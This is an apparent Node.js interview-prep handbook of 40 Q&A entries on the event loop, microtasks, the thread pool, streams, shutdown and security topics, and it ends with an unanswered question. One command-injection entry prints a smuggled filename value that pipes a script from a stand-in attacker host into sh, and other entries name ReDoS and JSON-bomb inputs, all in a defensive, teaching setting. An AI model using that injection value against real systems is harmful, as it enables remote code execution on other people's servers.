# Essential Node.js — Must Know

3-day essential set. 40 questions in preparation order. Full handbook remains under `nodejs/`.

### NODE-052 — One callback, then nextTick, then promise jobs

**Difficulty:** Senior

**Category:** Microtasks

**Question:**

State the checkpoint Node runs after one phase callback on Node 20 or 22, including work scheduled while draining. Predict the log when `onTurn` is a timers, poll, or check callback, not top-level ESM. This is not NODE-021.

```js
function onTurn() {
  const out = [];
  process.nextTick(() => out.push('tick'));
  Promise.resolve().then(() => out.push('promise'));
  queueMicrotask(() => out.push('micro'));
  process.nextTick(() => {
    out.push('tick2');
    queueMicrotask(() => out.push('micro-from-tick'));
  });
  Promise.resolve().then(() => {
    out.push('promise2');
    process.nextTick(() => out.push('tick-from-promise'));
  });
  setImmediate(() => console.log(out.join(',')));
}
```

**Answer:**

After one phase callback returns, Node empties the `process.nextTick` queue, then runs promise jobs and `queueMicrotask` callbacks. If one of those jobs queues another `nextTick`, Node repeats until both queues are empty. Only then does the next callback or phase start. In this snippet the log is `tick,tick2,promise,micro,promise2,micro-from-tick,tick-from-promise`. `tick2` still belongs to the first `nextTick` drain, so it runs before any promise. `tick-from-promise` waits until that microtask queue is empty. This is an ordinary phase callback, not the ES module case in NODE-021.

**Follow-up:**

If `promise2` queues `queueMicrotask(() => out.push('inner'))` instead of `nextTick`, where does `inner` land?

Answer: `inner` is another microtask, so it runs before the checkpoint finishes. It is queued while `promise2` is running, after `micro-from-tick` was already waiting, so it prints after `promise2` and after `micro-from-tick`. It does not enter the `nextTick` queue, and it does not wait for a later phase.

### NODE-051 — The phases a Node 20 loop actually walks

**Difficulty:** Senior

**Category:** Event loop phases

**Question:**

Draw the event-loop phases for a Node 20 or 22 process and say what each one is for. A teammate draws timers at the start of every lap and asks where `process.nextTick` sits. Correct the lap, and leave `nextTick` out of the phase boxes.

**Answer:**

The event loop is the cycle Node uses to run queued callbacks. On Node 20 and 22, libuv 1.45 and later runs due timers once before the loop if the loop is already alive. Each lap is then pending callbacks, idle, prepare, poll, a bounded second pending pass, check, close, and timers. Poll runs ready I/O and may wait in the kernel. Check is `setImmediate`, close is an abrupt socket close, and timers are `setTimeout` and `setInterval`. Idle and prepare are internal. Opening every lap with timers is the older loop. `process.nextTick` is not a phase.

**Follow-up:**

Which phase can block in the OS, and which only run already-queued JavaScript?

Answer: Poll is the phase that can block, and only when its computed wait is greater than zero. Every other phase runs callbacks or internal handles that are already queued, then returns. Once any callback has started, it holds the JavaScript stack until it returns, in every phase.

### NODE-002 — One call stack per isolate, and where an async callback actually runs

**Difficulty:** Intermediate

**Category:** Execution model

**Question:**

Explain the JavaScript call stack in Node 20/22 (main thread only). A teammate says `fs.readFile` "runs the callback on the thread pool" so JSON can parse on a second JS stack. Correct the model: what is spec, V8, and Node?

**Answer:**

A V8 isolate has one heap and one JavaScript call stack, and the main thread has exactly one isolate. When you call `fs.readFile`, the function returns right away. libuv may do the actual disk read on a thread pool thread, but that thread runs only native code, never your JavaScript. When the read finishes, the callback is queued and later runs as a fresh turn on the main stack, once that stack is empty. A second JavaScript stack would need `worker_threads`, which creates a separate isolate.

**Code:**

```js
readFile(url, () => JSON.parse(/* later, main stack only */));
// handler frame is still running; callback is not
```

**Follow-up:**

What does `new Promise(executor)` do with the stack versus a `.then` callback?

Answer: The executor passed to `new Promise` runs synchronously, on the current stack, before the constructor returns. A `.then` callback is different: it runs later as a microtask on the same stack, after the current code finishes. Neither uses the libuv thread pool.

### NODE-102 — Why I/O scales on one thread and CPU does not

**Difficulty:** Intermediate

**Category:** Async vs parallel

**Question:**

Why can one Node thread serve thousands of concurrent sockets but not thousands of concurrent hash computations?

**Answer:**

A socket wait is handed to the operating system, through epoll, kqueue, or IOCP. JavaScript runs only for a short turn when data is ready, so a connection that is waiting does not occupy a thread. A hash computation holds the JavaScript thread for its whole duration. While it runs, no other callback on that thread can start, including every other connection. Waiting on many sockets is cheap because the thread is free between events. Computing many hashes needs more cores, because each hash consumes the thread the whole time.

**Follow-up:**

Is the cost always CPU time?

Answer: No. Anything synchronous holds the loop, including `fs.readFileSync`, a large `JSON.parse`, catastrophic regex backtracking, and `zlib` sync methods. Those stall other callbacks even when there is no parallel CPU work to gain.

### NODE-003 — Why a synchronous loop stalls callbacks that are already finished

**Difficulty:** Intermediate

**Category:** Execution model

**Question:**

A handler calls `fs.readFile`, then runs a tight synchronous loop for tens of ms with no `await`. The read finishes during the loop. Why does the callback wait, and how does that differ from `fs.readFileSync`? Node 20/22, main isolate.

**Answer:**

JavaScript runs each job to completion. While your handler is on the stack, Node will not start any other JavaScript, including the file callback and promise reactions. libuv can finish the read in the background and queue the completion, but the callback waits until your loop ends and the stack is clear. `readFileSync` is different: the thread blocks inside the call and there is no callback at all. Both delay other work, but the async version simply delivers the finished result afterward.

**Trade-offs:**

Chunk CPU work, use a Worker, or keep `readFileSync` for small startup reads—not inside a live request handler.

**Follow-up:**

Would `await` inside the loop let the file callback run between iterations?

Answer: Only if each `await` waits on something that finishes in a later loop turn, such as `setImmediate`. Awaiting an already settled value runs only microtasks, and the file callback is not one. A plain `while` loop never yields.

### NODE-257 — What triggers `unhandledRejection` and what does Node 15+ do?

**Difficulty:** Junior

**Category:** Process-level handlers

**Question:**

What triggers `unhandledRejection` and what does Node 15+ do?

**Answer:**

It fires when a promise is rejected and no handler is attached by the time the microtask queue and process ticks have drained. Since Node 15, the default mode is `--unhandled-rejections=throw`. The rejection is raised as an `uncaughtException`, and the process exits with code 1 unless you have installed a handler.

**Follow-up:**

Recommended handler?

Answer: Log with context, flush the logs, then exit with a non-zero code so the supervisor restarts the process. Treat it like `uncaughtException`; do not just log and carry on. Even better, fix the cause by always attaching handlers.

### NODE-056 — await resumes as a microtask on this same thread

**Difficulty:** Senior

**Category:** Microtasks

**Question:**

Predict the log for `onTimer` below. Then answer claims that `await` blocks the thread or that the continuation runs on a new OS thread.

```js
async function label() {
  console.log('before');
  await null;
  console.log('after');
}
function onTimer() {
  console.log('timer');
  process.nextTick(() => console.log('tick'));
  label();
  setImmediate(() => console.log('immediate'));
  console.log('timer-end');
}
```

**Answer:**

`await` does not block the thread, and it does not move the rest of the function onto a pool thread or a worker. `label` runs until `await null`, then the continuation is queued as a promise microtask on this same isolate. `onTimer` keeps going and prints `timer-end` before `after`. The checkpoint runs `tick` before that microtask. On Node 20 and 22 the timers phase is at the end of the lap, so `immediate` waits for a later check. The order is `timer`, `before`, `timer-end`, `tick`, `after`, `immediate`.

**Follow-up:**

Change to `await new Promise(() => {})`. Which lines still print, and is the thread blocked?

Answer: `timer`, `before`, `timer-end`, and `tick` still print, and `after` never does, because that promise never settles. `immediate` still runs on a later lap. The pending promise holds memory, not the stack, and by itself it does not keep the process alive.

### NODE-253 — Operational vs programmer errors?

**Difficulty:** Junior

**Category:** Error design

**Question:**

What is the difference between operational errors and programmer errors?

**Answer:**

Operational errors are expected runtime failures: `ECONNREFUSED`, timeouts, invalid user input, a full disk. You handle them by retrying, degrading, or returning a 4xx or 5xx. Programmer errors are bugs: a `TypeError` on `undefined`, wrong argument types, a broken invariant. You cannot reliably recover from them. Fix the code, and if one escapes, crash and restart.

**Follow-up:**

Why not catch programmer errors and continue?

Answer: State may be partly changed or inconsistent, for example a half-written cache or a leaked lock. Continuing risks corruption and hides the bug. Fail fast, log, and let the supervisor start a clean process.

### NODE-155 — Backpressure

**Difficulty:** Intermediate

**Category:** Backpressure

**Question:**

What is backpressure, and how does Node implement it?

**Answer:**

Backpressure is the consumer telling the producer to slow down. When `writable.write(chunk)` returns `false`, the producer should stop writing until the writable emits `'drain'`. `pipe()` and `pipeline()` do this for you: they pause the source and resume it on `'drain'`. Without backpressure, if the producer is faster than the destination, the writable's buffer keeps growing until the process runs out of memory.

**Follow-up:**

What exactly makes `write()` return `false`?

Answer: The writable's buffered length reaching or exceeding its `writableHighWaterMark`. The write itself still succeeds.

### NODE-069 — A long synchronous callback stalls every later phase

**Difficulty:** Senior

**Category:** Starvation

**Question:**

A poll callback parses a large in-memory payload with a synchronous loop before scheduling anything. Timers are already due and another socket is readable. Why do none run during the parse, and what do you change?

**Answer:**

JavaScript runs a callback to completion. While the parse is on the stack, poll will not start a due timer, a check callback, or another socket's `'data'` handler, even if the kernel already knows that socket is readable. Split the work into chunks and schedule the next chunk with `setImmediate`, using the phase placement from NODE-064, or move the CPU work to a worker. The libuv pool does not help, because the bytes are already on the heap and the loop is JavaScript. Scheduling the next chunk with `process.nextTick` does not yield to poll.

**Follow-up:**

A health-check `'data'` handler and its timeout both miss during the parse. Is that a poll bug?

Answer: No. Both are waiting for the parse to return, because the callback is too long. Phase order cannot insert a pause that JavaScript does not take.

### NODE-079 — fs.readFile uses the pool because a file read can block; a TCP read does not

**Difficulty:** Senior

**Category:** Thread pool

**Question:**

Both `fs.readFile` and a TCP `'data'` handler are "asynchronous." Why does the file read take a pool thread and the socket read not? Where does each JavaScript callback run?

**Answer:**

"Asynchronous" covers two mechanisms. A TCP socket is non-blocking. The poller watches it, and the isolate reads ready bytes during poll, with no pool thread. A regular file read can block in the kernel, so libuv runs it on the pool and later posts a completion. The JavaScript callback still runs on the main isolate, in poll. Synchronous file APIs block the isolate for the whole call and have no callback. `dns.lookup` is the same kind of offload as the file read.

**Follow-up:**

What does `readFileSync` do to a connection that becomes readable during the syscall, compared with an in-flight `readFile`?

Answer: `readFileSync` holds the isolate, so poll cannot deliver `'data'` until the syscall returns. An in-flight `readFile` holds a pool thread instead, and poll can still deliver TCP data while that read continues. The file's own JavaScript callback waits for a later poll turn after the completion is posted.

### NODE-292 — Graceful shutdown with connection draining?

**Difficulty:** Senior

**Category:** Graceful shutdown

**Question:**

How do you shut down gracefully while draining connections?

**Answer:**

On SIGTERM, mark the service not-ready and wait briefly for the load balancer to deregister it. Call `server.close()` to stop new connections, then `server.closeIdleConnections()` (Node 18.2+). Wait for in-flight requests to finish, close databases and queues, and exit. Force the exit after a timeout.

**Follow-up:**

Why doesn't `server.close()` finish with keep-alive?

Answer: It waits for existing connections to close, and idle keep-alive sockets stay open. Use `closeIdleConnections()`, and after a deadline `closeAllConnections()`. In Node 19+, `close()` already closes idle ones.

### NODE-101 — Why async is not parallel

**Difficulty:** Intermediate

**Category:** Async vs parallel

**Question:**

A teammate says wrapping CPU-heavy functions in `async` and awaiting them with `Promise.all` makes them run in parallel. Is that true in Node?

**Answer:**

`async` schedules continuations on the one JavaScript thread. It does not create threads, so the functions do not run at the same time. A CPU-bound function holds that thread until it returns, and the event loop cannot run anything else while it does. `Promise.all` over ten of those functions still does the work one after another, so the wait is about ten times one call. Async pays off when the wait is I/O that the operating system or libuv performs elsewhere. CPU parallelism needs workers, child processes, or cluster.

**Follow-up:**

How would you spot this in production?

Answer: Event-loop delay and tail latency rise, timers fire late, and one core sits near full while the others stay idle. `perf_hooks.monitorEventLoopDelay()` makes that stall visible.

### NODE-057 — A tight nextTick loop starves I/O

**Difficulty:** Senior

**Category:** Starvation

**Question:**

This program schedules a check callback and a file read, then calls `starve`. What prints? Why does the file callback not run even if the OS has finished the read?

```js
function starve() { process.nextTick(starve); }
setImmediate(() => console.log('immediate'));
readFile(__filename, () => console.log('io'));
starve();
```

**Answer:**

Nothing prints. `starve` queues another `nextTick` every time it runs, so the checkpoint never becomes empty. The loop therefore never reaches poll or check, and neither `immediate` nor `io` can run. The thread pool may finish the file read and post a completion, but the JavaScript callback still has to wait for a poll turn on the main isolate. This is a queue that never drains, not a lock deadlock. A promise chain that keeps scheduling itself has the same shape on the microtask queue.

**Follow-up:**

If `starve` stops after a fixed count, can `io` print before `immediate`?

Answer: Once `nextTick` empties, both callbacks can be reached. If the read has already completed, poll can run `io` before check runs `immediate`; if it is still in flight, `immediate` can win. Stopping the flood does not create one fixed order between them.

### NODE-082 — An async function that throws rejects; a non-async throw escapes the turn

**Difficulty:** Senior

**Category:** Errors

**Question:**

Compare three timer callbacks: a non-async function that throws, an `async` function that throws before its first `await`, and a function that only does `return Promise.reject()`. What does the caller of `setTimeout` catch, which process event applies, and which callbacks still reach later lines in the timer?

**Answer:**

A `try/catch` around `setTimeout` catches none of these, because the callback is a later turn. A non-async throw skips the rest of that callback and becomes `uncaughtException` unless you catch it inside. An `async` throw before the first `await` rejects the returned promise before that call returns, and later lines in the timer still run. If nobody handles it, the event is `unhandledRejection`. `return Promise.reject()` uses that same channel, and the timer continues. A throw after `await` rejects in a microtask the timer has already left.

**Follow-up:**

`await boom()` inside an async timer, with `try/catch` around it, and `setImmediate` scheduled before the `await`. Where does `catch` run relative to the immediate?

Answer: `catch` is part of the timer callback's microtask continuation, so it runs in that checkpoint, before check. The immediate was already queued, and `catch` still runs first.

### NODE-262 — What is `AbortController`/`AbortSignal` and how do errors surface?

**Difficulty:** Junior

**Category:** Cancellation

**Question:**

What is `AbortController`/`AbortSignal` and how do errors surface?

**Answer:**

They are the standard way to cancel async work. Calling `controller.abort()` sets `signal.aborted` to `true`. APIs that accept a `signal`, such as fetch, timers/promises, fs, `events.once`, and child_process, then reject with an `AbortError`, which has `name: 'AbortError'` and `code: 'ABORT_ERR'`.

**Follow-up:**

How do you distinguish abort from real failure?

Answer: Check `err.name === 'AbortError'` or `err.code === 'ABORT_ERR'`, and look at `signal.reason`. Treat it as an expected cancellation: do not alert, and do not retry blindly.

### NODE-259 — What should you do on `uncaughtException`?

**Difficulty:** Senior

**Category:** Process-level handlers

**Question:**

What should you do on `uncaughtException`?

**Answer:**

Treat the process as unreliable. Log the error, making sure the log is flushed, and stop accepting new work. Then try a short graceful shutdown with a hard timeout, and exit with a non-zero code. Never go back to normal operation.

**Follow-up:**

`uncaughtExceptionMonitor`?

Answer: It lets you observe the event without changing the default crash behavior. That makes it a good fit for telemetry such as Sentry, because it cannot accidentally swallow the exception the way a regular handler can.

### NODE-103 — Options for CPU-heavy work

**Difficulty:** Intermediate

**Category:** Async vs parallel

**Question:**

A request handler must resize images or hash large payloads. List the ways to keep the event loop responsive, and when you would pick each.

**Answer:**

Worker threads fit in-process CPU work when messages stay small. A child process fits another binary, or a crash you can kill without the parent. Cluster, or several replicas, spreads requests across cores. Native addons and async crypto or zlib use libuv's pool for work already written in C. `setImmediate` between chunks suits a short loop you can pause. A queue and a separate service fit a job that is long or must survive a restart. Choose by isolation, payload size, and whether the work is one request or background.

**Follow-up:**

Why is chunking with `setImmediate` a weak default?

Answer: It only yields the thread. The total CPU time is unchanged and still on the main thread, and the slicing logic is extra code. It suits a small loop you can pause, not heavy compute.

### NODE-055 — Timeout versus immediate inside I/O, and at the top level

**Difficulty:** Senior

**Category:** Timers

**Question:**

Predict `setTimeout(fn, 0)` against `setImmediate(fn)` inside an I/O callback and at the top level of the main module. Which prediction do the phase rules support, and which do you refuse?

**Answer:**

Inside a poll I/O callback the order is fixed. The callback finishes its synchronous work, the checkpoint runs `nextTick` and then promises, check runs the immediate, and timers run the timeout after its 1 millisecond floor. In that situation the hypothetical log is `io`, `tick`, `promise`, `immediate`, `timeout`. At the top level of the main module, refuse to name a winner. The timers pass before the loop may or may not see the timeout as due before the first check. Startup timing decides, and Node's own guide shows both orders.

**Trade-offs:**

Prefer not to need this order. When the intent is "after I/O callbacks may run," use `setImmediate`. When you need a real minimum delay, pass that delay to `setTimeout`. Do not use `0` as slang for "next."

**Follow-up:**

If `setTimeout(fn, 0)` is scheduled before `readFile`, and `setImmediate` stays inside the read callback, can `timeout` print before `io`?

Answer: Yes. The timer can fire in any timers phase that finds it due before the thread-pool completion reaches poll. Once `io` runs, the immediate is only then scheduled, so you no longer have the stable "immediate, then timeout" pattern from inside I/O.

### NODE-156 — pipe vs pipeline

**Difficulty:** Intermediate

**Category:** pipe and pipeline

**Question:**

What are the differences between `.pipe()` and `stream.pipeline()`?

**Answer:**

Both handle backpressure, but only `pipeline()` handles errors. With `pipe()`, if the destination fails, the source is just unpiped and stays open. That can leak file descriptors or sockets, and you need an `'error'` handler on every stream. `pipeline()` forwards errors, destroys all the streams when something fails or finishes, and reports the result once through a callback or a promise. That is why you should prefer it in production.

**Follow-up:**

If the middle Transform throws, which streams are destroyed?

Answer: All of them: the source, the Transform, and the destination. The callback or promise receives the first error.

### NODE-289 — EventEmitter `'error'` event behavior?

**Difficulty:** Junior

**Category:** Emitters and streams

**Question:**

How does the `'error'` event behave on an EventEmitter?

**Answer:**

If an emitter emits `'error'` and no listener is attached, the error is thrown, and it crashes the process if nothing catches it. Streams, sockets, and servers all emit `'error'`, so each one needs an `error` handler.

**Follow-up:**

`captureRejections` option?

Answer: `new EventEmitter({ captureRejections: true })` sends rejected promises from async listeners to the `'error'` event, or to `Symbol.for('nodejs.rejection')`, instead of `unhandledRejection`.

### NODE-119 — UV_THREADPOOL_SIZE versus worker threads

**Difficulty:** Senior

**Category:** Threadpool vs workers

**Question:**

What is the difference between `UV_THREADPOOL_SIZE` and `worker_threads`?

**Answer:**

`UV_THREADPOOL_SIZE` sets how many threads libuv keeps for native blocking work. The default is 4 and the maximum is 1024. Those threads run C or C++ for many `fs` calls, `dns.lookup`, `pbkdf2`, `scrypt`, `randomBytes`, and `zlib`. They never run your JavaScript. A worker thread is a separate isolate that does run JavaScript. Raising the environment variable adds native concurrency. It does not make a JavaScript loop faster. Set it in the environment before the process starts, or at least before anything uses the pool, because a later change is ignored.

**Follow-up:**

Does each worker get its own libuv pool?

Answer: Each worker has its own event loop, but the libuv thread pool is shared by the whole process. Heavy native work in several workers competes for those same threads.

### NODE-053 — setTimeout(fn, 0) is a timer with a minimum, not "run next"

**Difficulty:** Intermediate

**Category:** Timers

**Question:**

A candidate writes `setTimeout(fn, 0)` and calls it "run `fn` next, after this function." Say what Node 20 or 22 schedules, which phase runs it, and what the `0` becomes. Does Node apply the browser nested-timer clamp?

**Answer:**

`setTimeout(fn, 0)` schedules a timers-phase callback. It does not run as soon as the current function returns. Node raises any delay below 1 millisecond, including 0, to 1 millisecond. A delay above 2,147,483,647 is also forced to 1, with a warning. The delay is a minimum. The callback runs when a later timers phase finds it due, which on Node 20 and 22 is the end of a lap, plus one timers pass before the loop starts. Node does not apply the browser's 4 millisecond nested-timer clamp, and this is not `process.nextTick`.

**Follow-up:**

What does `setTimeout(fn, 1.9)` store, and how are two such timers ordered?

Answer: `1.9` stays `1.9`. It is already at least 1 and within the 32-bit range, so Node does not chop it down to 1. Two timers with that same delay run in registration order: the one created first runs, then its checkpoint, then the later one.

### NODE-274 — Why set timeouts on everything?

**Difficulty:** Junior

**Category:** Timeouts

**Question:**

Why set timeouts on everything?

**Answer:**

Without a timeout, a hung dependency holds sockets, memory, and event-loop callbacks indefinitely, and one slow service can cascade into a wider outage. Set connect timeouts, request timeouts, and an overall deadline for HTTP, database, and queue operations.

**Follow-up:**

Node http server timeouts?

Answer: The main ones are `server.headersTimeout`, `requestTimeout` (default 300 s in Node 18+), `keepAliveTimeout` (5 s), and the legacy `server.timeout`. Set `keepAliveTimeout` above the load balancer's idle timeout to avoid 502s.

### NODE-276 — What is idempotency and why vital with retries?

**Difficulty:** Junior

**Category:** Idempotency

**Question:**

What is idempotency and why is it vital with retries?

**Answer:**

An operation is idempotent if doing it several times has the same effect as doing it once. Retries, message redeliveries, and double-clicks make duplicate requests unavoidable. If your handlers are idempotent, those duplicates are harmless.

**Follow-up:**

Which HTTP methods are idempotent?

Answer: By specification, GET, HEAD, PUT, DELETE, and OPTIONS. POST and PATCH are not idempotent by default, so use idempotency keys for them.

### NODE-178 — Memory blowup from wrong buffering

**Difficulty:** Senior

**Category:** Memory

**Question:**

How does wrong buffering blow up memory in stream code, and how do you fix it?

**Answer:**

Memory blows up when it grows with the input size or with the speed gap between producer and consumer. Typical causes are collecting every chunk into an array or string, calling `readFile` and `JSON.parse` on huge inputs, and producers that ignore backpressure. The fix is to process data incrementally through `pipeline`, cap the number of bytes you accumulate, and respect the return value of `write()`.

**Follow-up:**

How would you diagnose it?

Answer: Compare RSS with heap used, because Buffers live outside the heap. Also sample `readableLength` and `writableLength` on suspect streams. Lengths that keep growing point to missing backpressure.

### NODE-338 — Sync I/O on the request path

**Difficulty:** Intermediate

**Category:** Blocking work

**Question:**

Why is synchronous I/O on the request path so damaging in Node?

**Answer:**

`readFileSync`, `writeFileSync`, `execSync`, and sync crypto run on the main thread. While they run, the event loop cannot accept connections, run timers, or process other requests. One slow disk and one unlucky request stall every connection that process is handling. Async I/O is the default for that reason, not because sync is unfashionable. Sync is acceptable in startup, in a short CLI, or in a one-off script where nothing else is waiting on the loop. I grep the request path for `Sync` and for heavy CPU before I look at exotic flags.

**Follow-up:**

The sync call is "only a small config file." Why can that still hurt?

Answer: A small read can still block on a slow disk, and every request pays that stall if the call sits in the handler. Load config once at startup. The problem is where the call sits, not only how big the file is.

### NODE-399 — Event-loop denial of service and JSON bombs

**Difficulty:** Senior

**Category:** Denial of service

**Question:**

How does an attacker deny service to one Node 20 or 22 process without a bandwidth flood?

**Answer:**

They keep the single event-loop thread busy, or they force a memory spike. `fs.readFileSync`, `crypto.pbkdf2Sync`, synchronous scrypt, and synchronous compression of a large buffer block every other request on that process. `JSON.parse` of a huge body does the same. A size limit is necessary and not sufficient. `express.json({ limit: '100kb' })` stops a wide payload, and a 100kb body of deeply nested arrays can still burn CPU or blow the stack. Inflating gzip before you cap bytes has the same shape. Stream uploads to storage with a byte cap, and keep the request timers finite.

**Follow-up:**

What do you put in front of `bcrypt` on login so the hash cannot be the bottleneck?

Answer: Apply the rate limit and a maximum password length before `bcrypt.compare`. Bcrypt only uses the first 72 bytes, and a huge password still costs time if you accept it, so reject absurd lengths with a 400 and use the async API.

### NODE-239 — Graceful HTTP shutdown

**Difficulty:** Senior

**Category:** Shutdown

**Question:**

Describe a proper graceful shutdown for an HTTP service.

**Answer:**

On `SIGTERM`, first fail the readiness probe, then call `server.close()` to stop accepting connections. Set `Connection: close` on in-flight responses, and wait for requests to finish, for example with an in-flight counter. Call `closeIdleConnections()`, then close databases and queues. Set a hard timeout, such as 10–25 s, below the orchestrator's `terminationGracePeriodSeconds`. When it expires, call `closeAllConnections()` and exit.

**Follow-up:**

Why wait before calling `server.close()` in Kubernetes?

Answer: Removing the endpoint takes time to propagate. A few seconds of delay, such as a preStop sleep, lets load balancers stop routing traffic to you before you refuse new connections.

### NODE-355 — ReDoS on the event loop

**Difficulty:** Junior

**Category:** ReDoS

**Question:**

What is a regular-expression denial of service in Node, and why is the event loop part of the story?

**Answer:**

ReDoS is a regular expression whose worst-case time explodes with input length, usually because of nested quantifiers and backtracking. A few dozen characters, such as a long run of `a` against `^(a+)+$`, can occupy one CPU for seconds or minutes. Node runs your JavaScript on a single thread per process. While `RegExp` is executing, that process does not run other request callbacks. Health checks time out, the orchestrator restarts the pod, and the attacker repeats it. Cap the input size, and use a pattern that stays linear, or an engine that refuses catastrophic expressions.

**Follow-up:**

Why is wrapping the match in a timer a weak primary control?

Answer: A `Promise.race` timeout does not abort `RegExp.prototype.exec` on the same thread. A worker can be terminated, and it still burns a core until then, so prefer a safe pattern or the linear-time `re2` module, and keep a worker limit only as a backstop.

### NODE-120 — What uses the libuv threadpool

**Difficulty:** Senior

**Category:** Threadpool vs workers

**Question:**

Which Node operations run on the libuv threadpool, and which do not?

**Answer:**

The pool runs most asynchronous `fs` calls, `dns.lookup` because it calls `getaddrinfo`, `crypto.pbkdf2`, `scrypt`, `randomBytes` and `randomFill`, the async `zlib` methods, and some native addons. TCP, UDP, and HTTP do not use it. The kernel waits for those sockets. `dns.resolve` and the other resolver methods use c-ares on the loop, not the pool. Timers and your JavaScript do not use it either. The split matters because a flood of slow file calls can occupy the default four threads and delay an unrelated `dns.lookup` that is waiting for a free one.

**Follow-up:**

Why is `dns.lookup` the surprising member of that list?

Answer: It looks like network I/O, but it calls the blocking `getaddrinfo`. Slow DNS can fill the four default pool threads and stall `fs` operations that need the same pool.

### NODE-104 — What a worker thread is

**Difficulty:** Intermediate

**Category:** worker_threads

**Question:**

What is a `worker_threads` worker, and how does it differ from a thread in Java or C++?

**Answer:**

A worker is another V8 isolate in the same process, with its own heap, event loop, and module graph, on its own operating-system thread. It cannot touch the parent's JavaScript objects. You send copies, or you share a `SharedArrayBuffer`. A Java or C++ thread mutates one heap and needs locks. A worker has no shared objects and no locks on a common heap. Startup and the private heap cost on the order of tens of milliseconds and a few megabytes, so you pool workers instead of starting one per task.

**Follow-up:**

Does a worker share the `require` cache or module state with the parent?

Answer: No. Each worker loads its own copy of every module. A module-level singleton, such as a database client, is a separate instance in each worker.

### NODE-269 — Why do retries need backoff and jitter?

**Difficulty:** Junior

**Category:** Retries

**Question:**

Why do retries need backoff and jitter?

**Answer:**

Retrying immediately adds load to a dependency that is already struggling, which creates a retry storm. Exponential backoff spaces the attempts further apart each time. Jitter adds randomness to the delays, so many clients do not all retry at the same moment, which would cause a thundering herd.

**Follow-up:**

Which jitter strategy?

Answer: "Full jitter": `sleep = random(0, min(cap, base * 2^attempt))`. AWS's analysis found that it reduces contention and total completion time compared with equal jitter or no jitter.

### NODE-179 — Ignoring write() return value

**Difficulty:** Senior

**Category:** Backpressure

**Question:**

What is wrong with writing in a loop and ignoring the return value of `write()`?

**Answer:**

`write()` never blocks. In a loop like `for (...) w.write(row)`, if the destination is slower than the loop, everything piles up in memory. The correct pattern is `if (!w.write(x)) await once(w, 'drain')`. Even better, produce the data from a Readable or an async generator and send it through `pipeline`, which handles this for you.

**Code:**

```js
import { once } from 'node:events';

async function writeAll(w, iterable) {
  for (const chunk of iterable) {
    if (!w.write(chunk)) await once(w, 'drain');
  }
  w.end();
}
```

**Follow-up:**

What if the writable errors while waiting for `'drain'`?

Answer: `events.once` rejects when `'error'` fires, so the `await` throws and the loop stops. A `'close'` without `'drain'` would hang, so guard with an `AbortSignal` or check `w.destroyed`.

### NODE-010 — What V8 does, what Node adds, and where libuv starts

**Difficulty:** Senior

**Category:** Runtime architecture

**Question:**

"Node is single-threaded because it uses V8." Unpick for Node 20/22: isolate, V8's job, what Node wraps, and the two libuv paths (main-thread loop vs thread pool). Stop before phase order.

**Answer:**

V8 is the JavaScript engine: it parses and runs code, and it manages the heap and garbage collection. An isolate is one engine instance with its own heap and one JavaScript stack. Node embeds V8 and adds APIs like `process`, `Buffer`, `fs`, and `http`. libuv provides the event loop, plus a thread pool, four threads by default, for blocking native work. So the accurate claim is that JavaScript in one isolate is single-threaded, but the process is not: it also has pool threads, Workers, and native helper threads.

**Follow-up:**

Which thread runs a promise reaction queued from a `net` socket `data` handler?

Answer: The isolate that owns the socket, which is the main thread for a normal server. The reaction is a microtask on that same stack. It never runs on the thread pool or in a Worker unless you explicitly send work to one.

### NODE-361 — Command injection through `exec`

**Difficulty:** Junior

**Category:** Command injection

**Question:**

Why is `` exec(`convert ${filename} out.png`) `` remote code execution when `filename` comes from a request?

**Answer:**

`child_process.exec` always runs the string in a shell: `/bin/sh -c` on Unix and `cmd.exe` on Windows. The shell parses `;`, `|`, backticks, `$()`, newlines, and quotes. A filename of `x.png; curl https://evil.example/x | sh` runs `convert` and then the attacker's command as the Node user. `execSync` has the same behavior. Pass an argument vector: `spawn('convert', [filename, 'out.png'])` or `execFile` with that same array. With the default `shell: false`, the filename is one argument and the shell never parses it. Also allowlist the executable, so the caller cannot choose `bash` as the program.

**Follow-up:**

The shell is gone and an attacker still overwrites files. What remains?

Answer: Argument injection remains, because `git`, `tar`, `ffmpeg`, and `curl` may treat a leading dash as a flag. Insert `--` before user arguments when the tool supports it, and reject values that start with `-`.

### NODE-351 — What prototype pollution is

**Difficulty:** Junior

**Category:** Prototype pollution

**Question:**

What is prototype pollution in a Node process, and why can one request change later requests?

**Answer:**

Prototype pollution means untrusted input writes a property onto a shared prototype, almost always `Object.prototype`. Ordinary objects inherit from that prototype, so `user.isAdmin` can be true even when that user never had the field. The prototype is process-wide, so one request changes every later request until you restart. The usual path in is a deep merge or a nested query parser copying a JSON body. What you lose is an authorization check, and sometimes more, if a library treats the extra property as a command or a file path.

**Follow-up:**

Why does a missing-property check become dangerous after this?

Answer: Code like `if (user.isAdmin)` treats a missing field as false, and JavaScript walks the prototype when the object does not own the key. After `Object.prototype.isAdmin` is true, every object that does not override it looks privileged. `Object.hasOwn(user, 'isAdmin')` reads only the object itself.

### NODE-255 — Error handling patterns: callbacks, promises, async/await?

**Difficulty:** Junior

**Category:** Async propagation

**Question:**

How does error handling differ between callbacks, promises, and async/await?

**Answer:**

Callbacks use the error-first style `(err, data)`, and you must check `err` yourself. Throwing inside an async callback escapes any surrounding `try/catch`. Promises pass errors along as rejections, which you handle with `.catch`. With `async/await`, a normal `try/catch` handles rejections inside the same function. Pick one style per API, and always return or await your promises.

**Follow-up:**

Why does `try { setTimeout(() => { throw e }) } catch {}` not catch?

Answer: The callback runs later, on a fresh call stack, after the `try` block has already exited. The throw becomes an `uncaughtException`. Put the `try/catch` inside the callback, or use promisified timers with `await`.

### NODE-209 — Request body size limits

**Difficulty:** Intermediate

**Category:** Body limits

**Question:**

How do you enforce a request body size limit in raw Node?

**Answer:**

First, check `Content-Length` and reply `413` right away if it is too large. Do not trust it alone, because chunked bodies have no length. So also count bytes as they stream in, using a `Transform` or `req.on('data')`, and abort when the limit is exceeded. Then respond with 413 and `Connection: close`, and destroy the request.

**Follow-up:**

Why is `JSON.parse` of the whole body dangerous without limits?

Answer: Buffering unbounded input can exhaust memory, and parsing a huge body blocks the event loop. Cap the bytes before buffering, and consider limits on the depth and size of the parsed structure too.

### NODE-330 — RSS, heapTotal, and heapUsed

**Difficulty:** Intermediate

**Category:** Process memory

**Question:**

How do you explain `rss`, `heapTotal`, and `heapUsed` without mixing them up?

**Answer:**

